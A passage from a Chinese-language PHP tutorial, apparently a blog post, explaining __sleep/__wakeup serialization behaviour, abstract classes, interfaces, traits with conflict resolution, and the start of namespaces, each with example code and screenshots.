class="variable">$obj2</span>-&gt;age.<span class="string">&#x27;, city: &#x27;</span>.<span class="variable">$obj2</span>-&gt;city.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121144940.png" /></p>
<p>加入后两个魔术方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Staff</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$city</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$city</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;city = <span class="variable">$city</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;city&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;city = <span class="string">&#x27;beijing&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="string">&#x27;m1ku&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$obj1</span> = <span class="keyword">new</span> Staff(<span class="string">&#x27;takagi&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;fuzhou&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;My name: &#x27;</span>.<span class="variable">$obj1</span>-&gt;name.<span class="string">&#x27;, age: &#x27;</span>.<span class="variable">$obj1</span>-&gt;age.<span class="string">&#x27;, city: &#x27;</span>.<span class="variable">$obj1</span>-&gt;city.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$objStr</span> = serialize(<span class="variable">$obj1</span>);  <span class="comment"># 序列化</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$objStr</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$obj2</span>= unserialize(<span class="variable">$objStr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;My name: &#x27;</span>.<span class="variable">$obj2</span>-&gt;name.<span class="string">&#x27;, city: &#x27;</span>.<span class="variable">$obj2</span>-&gt;city.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121145155.png" /></p>
<p>可以观察到，序列化时 <code>$age</code>
没有被序列化，反序列化时，<code>$name</code> 和 <code>$city</code>
被修改。</p>
<h1 id="抽象方法与抽象类的声明与使用">14.
抽象方法与抽象类的声明与使用</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Demo::test()&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>像上述代码中一样，在类中有抽象方法 <code>abstract ...</code>
的类称为抽象类，用关键字 <code>abstract</code>
声明，<strong>抽象方法必须在抽象类中，抽象类中也必须有抽象方法</strong>，抽象类不能够实例化，它是一个模板，它里面声明的抽象方法必须在子类中全部实现。因此，<strong>抽象类其实是一个子类的模板</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Demo::test()&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> <span class="keyword">extends</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Hello &#x27;</span>.<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;我的名字是：&#x27;</span>.<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Demo1(<span class="string">&#x27;takagi&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;hello();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;say();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;test();</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121145953.png" /></p>
<h1 id="接口技术">15. 接口技术</h1>
<p>接口是一种特殊的类，使用 <code>interface</code>
来声明，接口的成员中：</p>
<ul>
<li>属性：必须是类常量；</li>
<li>方法：必须是抽象方法；</li>
<li>访问控制符：必须是 <code>public</code>，可以省略不写；</li>
</ul>
<p>接口不允许被实例化，但可以被继承，所以<strong>需要创建一个子类来继承接口，并实现接口中的全部抽象方法。</strong></p>
<ul>
<li>接口可以试想多继承，使用关键字 <code>implements</code>；</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Demo1</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> NAME = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">mess</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Demo2</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">implements</span> <span class="title">Demo1</span>, <span class="title">Demo2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;My name is &#x27;</span>.<span class="built_in">self</span>::NAME;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">mess</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;domain: www.baidu.com&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::NAME.<span class="string">&#x27;.....&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;show();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;mess();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;hello();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121150702.png" /></p>
<h1 id="trait-特性php5.4-以后新增功能">16. Trait 特性（PHP5.4
以后新增功能）</h1>
<p>类中的代码有 2 部分：</p>
<ol type="1">
<li>自己写的私有代码；</li>
<li>从别处继承可导入的公共代码，主要来源；
<ol type="1">
<li>父类；</li>
<li>Trait 类（方法集）；</li>
</ol></li>
</ol>
<p>创建 <code>trait</code> 类的关键字是
<code>trait</code>。<code>trait</code> 的简单使用：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Demo1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Demo1::hello1()&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Demo2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$city</span> = <span class="string">&#x27;fuzhou&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Demo2::hello2()&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Demo1</span>, <span class="title">Demo2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;city;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;hello1();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;hello2();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121151429.png" /></p>
<p><code>use</code> 关键字可以理解为将后面的两个 <code>trait</code>
类的内容复制一遍到 <code>Test</code> 类中，像这样：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Demo1::hello1()&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$city</span> = <span class="string">&#x27;fuzhou&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Demo2::hello2()&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>trait</code> 类还可以进行嵌套：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Demo1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Demo1::hello1()&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Demo2</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Demo1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$city</span> = <span class="string">&#x27;fuzhou&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Demo2::hello2()&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Demo2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;city;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;hello1();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;hello2();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>结果还是一样的。</p>
<h2 id="父类和-trait-类方法重名">16.1. 父类和 trait 类方法重名</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Demo1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Demo1::hello1()&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;父类::hello1()&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span> <span class="keyword">extends</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Demo1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Test1;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;hello1();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121151942.png" /></p>
<p>可以看到结果执行了 <code>Demo1</code>
中的方法，而不是执行父类的方法，这是因为 <code>use</code> 相当于把
<code>trait</code>
类中的方法复制到当前类里面，可以理解为是当前类所拥有的的，而当前类如果与父类方法名相同，肯定会执行当前类的。如果需要访问父类：要么
<code>trait</code> 中的方法改名，要么父类中的方法改名。</p>
<h2 id="子类和-trait-类方法重名">16.2. 子类和 trait 类方法重名</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Demo1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Demo1::hello1()&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;父类::hello1()&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span> <span class="keyword">extends</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Demo1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Test1::hello1()&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Test1;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;hello1();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121152250.png" /></p>
<p>可以观察到，执行的是子类中的方法，虽然 <code>use</code>
是复制，但还是重别人处得来的，所以优先级不如子类本身拥有的。</p>
<h2 id="trait-类方法重名">16.3. Trait 类方法重名</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Demo1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Demo1::hello1()&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Demo2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$city</span> = <span class="string">&#x27;fuzhou&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Demo2::hello1()&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Demo1</span>, <span class="title">Demo2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Test1;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;hello1();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这是错误的，要想解决该错误，有一个最简单的解决方案，就是修改其中一个名字即可。或者使用如下方式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Demo1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Demo1::hello1()&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Demo2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$city</span> = <span class="string">&#x27;fuzhou&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Demo2::hello1()&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Demo1</span>, <span class="title">Demo2</span>&#123;</span><br><span class="line">        <span class="title">Demo1</span>::<span class="title">hello1</span> <span class="title">insteadof</span> <span class="title">Demo2</span>;</span><br><span class="line">        Demo2::hello1 <span class="keyword">as</span> demo2Hello1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;hello1();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;demo2Hello1();</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121152817.png" /></p>
<p>解释：</p>
<ul>
<li><code>Demo1::hello1 insteadof Demo2;</code> ：用 <code>Demo1</code>
中的 <code>hello1</code> 替换 <code>Demo2</code> 中的
<code>hello1</code>，这会导致 <code>Demo2</code>
中的方法永远不被访问；</li>
<li><code>Demo2::hello1 as demo2Hello1;</code> ：将 <code>Demo2</code>
中的 <code>hello1</code> 方法取一个别名
<code>demo2Hello1</code>，这样就可以使用 <code>demo1Hello1</code> 来访问
<code>Demo2</code> 中的 <code>hello1</code> 方法；</li>
</ul>
<h1 id="命名空间">17. 命名空间</h1>
<p>解决同一文件中成员命名冲突的问题。命名空间针对
<strong>函数、常量和类</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> SITE = <span class="string">&#x27;百度&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$i</span> + <span class="variable">$j</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Staff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$val</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> SITE = <span class="string">&#x27;谷歌&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$i</span> + <span class="variable">$j</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Staff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&#x27;m1ku&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$val</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
